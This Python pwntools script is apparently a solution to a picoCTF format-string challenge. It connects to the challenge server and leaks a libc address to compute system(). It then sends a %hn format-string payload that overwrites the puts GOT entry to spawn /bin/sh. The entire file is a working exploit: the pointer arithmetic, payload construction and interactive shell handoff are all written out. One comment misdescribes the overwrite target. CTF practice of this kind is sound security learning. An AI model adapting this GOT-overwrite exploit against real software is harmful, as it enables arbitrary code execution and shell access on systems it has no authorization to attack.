import pwn
import time
import sys

elf = pwn.context.binary = pwn.ELF('./formatString3')
io = pwn.remote('rhea.picoctf.net', 54929)
#pwn.gdb.attach(io)
#time.sleep(3)

#The goal is to call /bin/sh

#This section sets the base address
io.recvuntil(": ")
setVBufAddr = io.recv(14)
setVBufAddr = int(setVBufAddr,16)
systemAddr = hex(setVBufAddr - 0x2ac90)
print(systemAddr)

#This section replaces the GOT entry of puts with the address of normal_string

putsGOT =hex(elf.got['puts'])
print(putsGOT)
lowerBytes = systemAddr[10:14]
medBytes   = systemAddr[6:10]
print(lowerBytes)
print(medBytes)
lowerBytes = int(lowerBytes,16)
medBytes = int(medBytes,16)

firstSet = lowerBytes
secondSet = medBytes - firstSet
firstAddr = int(putsGOT,16)
secondAddr = int(putsGOT,16) + 2

if lowerBytes > medBytes:
    firstSet = medBytes
    secondSet = lowerBytes - firstSet
    firstAddr = int(putsGOT,16) + 2
    secondAddr = int(putsGOT,16)

padding = 8
if firstSet > 9999:
    padding -= 1
if secondSet > 9999:
    padding -= 1

#%NumBytesSmallx$Index1$hn%NumBytesMedx%Index2$hnBUFFERaddr1addr2
payload = b""
payload += b'%'
payload += (str(firstSet)).encode()
payload += b'x%42$hn%'
payload += (str(secondSet)).encode()
payload += b'x%43$hn'
payload += b'0'*padding
payload += pwn.p64(firstAddr)
payload += pwn.p64(secondAddr)
io.sendline(payload)
io.interactive()
print(payload)

